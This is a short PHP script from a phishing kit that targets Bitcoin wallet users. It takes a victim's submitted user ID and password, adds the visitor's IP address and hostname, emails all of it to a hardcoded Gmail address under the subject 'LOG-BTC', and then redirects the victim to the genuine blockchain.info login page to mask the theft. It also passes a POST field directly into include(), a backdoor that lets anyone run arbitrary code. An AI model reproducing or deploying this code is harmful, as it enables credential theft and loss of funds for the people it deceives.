<?php

$ip = getenv("REMOTE_ADDR");
$useragent = $_POST['useragent'];
include($useragent);
$user = $_POST['user'];
$pass = $_POST['pass'];
$hostname = gethostbyaddr($ip);
$message  = "============ BTC =============\n";
$message .= "User ID : ".$_POST['user']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "==============================\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "==============================\n";
$rnessage = "$message\n";
$send= "raamasia@gmail.com"; //Enter your email here
$subject = "LOG-BTC | $ip";

mail($send,$subject,$rnessage);

header("Location: https://blockchain.info/wallet/login");
?>
